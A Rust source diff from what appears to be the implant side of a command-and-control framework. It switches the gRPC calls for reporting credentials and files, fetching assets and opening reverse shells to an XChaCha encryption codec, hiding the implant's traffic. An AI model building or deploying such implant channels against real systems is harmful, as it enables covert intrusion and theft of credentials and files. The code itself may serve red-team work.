@@ -4,7 +4,6 @@ use hyper::Uri;
 use pb::c2::*;
 use std::str::FromStr;
 use std::sync::mpsc::{Receiver, Sender};
-use tonic::codec::ProstCodec;
 use tonic::GrpcMethod;
 use tonic::Request;
 
@@ -200,9 +199,7 @@ impl GRPC {
                 format!("Service was not ready: {}", e),
             )
         })?;
-        let codec: ProstCodec<ClaimTasksRequest, ClaimTasksResponse> =
-            tonic::codec::ProstCodec::default();
-
+        let codec = pb::xchacha::ChachaCodec::default();
         let path = tonic::codegen::http::uri::PathAndQuery::from_static(CLAIM_TASKS_PATH);
         let mut req = request.into_request();
         req.extensions_mut()
@@ -237,8 +234,7 @@ impl GRPC {
                 format!("Service was not ready: {}", e),
             )
         })?;
-        let codec: ProstCodec<FetchAssetRequest, FetchAssetResponse> =
-            tonic::codec::ProstCodec::default();
+        let codec = pb::xchacha::ChachaCodec::default();
         let path = tonic::codegen::http::uri::PathAndQuery::from_static(FETCH_ASSET_PATH);
         let mut req = request.into_request();
         req.extensions_mut()
@@ -268,9 +264,7 @@ impl GRPC {
                 format!("Service was not ready: {}", e),
             )
         })?;
-        let codec: ProstCodec<ReportCredentialRequest, ReportCredentialResponse> =
-            tonic::codec::ProstCodec::default();
-
+        let codec = pb::xchacha::ChachaCodec::default();
         let path = tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_CREDENTIAL_PATH);
         let mut req = request.into_request();
         req.extensions_mut()
@@ -302,8 +296,7 @@ impl GRPC {
                 format!("Service was not ready: {}", e),
             )
         })?;
-        let codec: ProstCodec<ReportFileRequest, ReportFileResponse> =
-            tonic::codec::ProstCodec::default();
+        let codec = pb::xchacha::ChachaCodec::default();
         let path = tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_FILE_PATH);
         let mut req = request.into_streaming_request();
         req.extensions_mut()
@@ -334,8 +327,7 @@ impl GRPC {
                 format!("Service was not ready: {}", e),
             )
         })?;
-        let codec: ProstCodec<ReportProcessListRequest, ReportProcessListResponse> =
-            tonic::codec::ProstCodec::default();
+        let codec = pb::xchacha::ChachaCodec::default();
         let path = tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_PROCESS_LIST_PATH);
         let mut req = request.into_request();
         req.extensions_mut()
@@ -361,8 +353,7 @@ impl GRPC {
                 format!("Service was not ready: {}", e),
             )
         })?;
-        let codec: ProstCodec<ReportTaskOutputRequest, ReportTaskOutputResponse> =
-            tonic::codec::ProstCodec::default();
+        let codec = pb::xchacha::ChachaCodec::default();
         let path = tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_TASK_OUTPUT_PATH);
         let mut req = request.into_request();
         req.extensions_mut()
@@ -389,8 +380,7 @@ impl GRPC {
                 format!("Service was not ready: {}", e),
             )
         })?;
-        let codec: ProstCodec<ReverseShellRequest, ReverseShellResponse> =
-            tonic::codec::ProstCodec::default();
+        let codec = pb::xchacha::ChachaCodec::default();
         let path = tonic::codegen::http::uri::PathAndQuery::from_static(REVERSE_SHELL_PATH);
         let mut req = request.into_streaming_request();
         req.extensions_mut()
